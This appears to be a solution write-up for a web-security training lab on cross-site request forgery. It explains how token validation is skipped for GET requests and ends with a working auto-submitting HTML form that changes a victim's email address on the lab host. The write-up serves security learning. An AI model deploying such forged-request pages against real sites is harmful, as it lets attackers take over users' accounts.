# Lab: CSRF where token validation depends on request method

**End Goal:** Host an HTML page on the exploit server that uses a CSRF attack to change the viewer's email address.

**Login:** `wiener:peter`

**Analysis**

- Access lab --> log in as wiener --> go to **My account**
- Open DevTools --> leave **Network** tab open so it records requests
- Type `test@test.com` in the Update email box --> Submit
- A `change-email` entry appears in the Network tab --> click it
- **Headers** tab --> under "General", Request Method is `POST`
- **Payload** tab --> Form Data lists the two body fields, `email` and a `csrf` token:

email
test@test.com
csrf
ZvIp57MxHoIgGVz9CVXDZKbWP5LCymDF


*So the request is a POST that sends a csrf token, meaning I can't forge it blindly. The lab name hints the token is only validated for certain methods, so I need to test a GET. I changed the URL to this:*

https://0a7f00ea036217cd80a336ec00a20066.web-security-academy.net/my-account/change-email?email=test@test.com

- Load it --> My account now shows `test@test.com`

*The email changed from a bare GET with no csrf token, so GET requests aren't validated at all. I can forge the whole thing as a GET with just the `email` param.*

- Build a page with a hidden form that sends the change as GET and auto-submits:


- Click **Go to exploit server** --> paste the HTML into the Body --> Store
- **Deliver exploit to victim** --> the victim's browser fires the GET with their session cookie, no token needed --> email changes

**Answer:**

<form action="https://0a7f00ea036217cd80a336ec00a20066.web-security-academy.net/my-account/change-email" method="GET">
  <input type="hidden" name="email" value="hacker@evil-user.net">
</form>
<script>
  document.forms[0].submit();
</script>
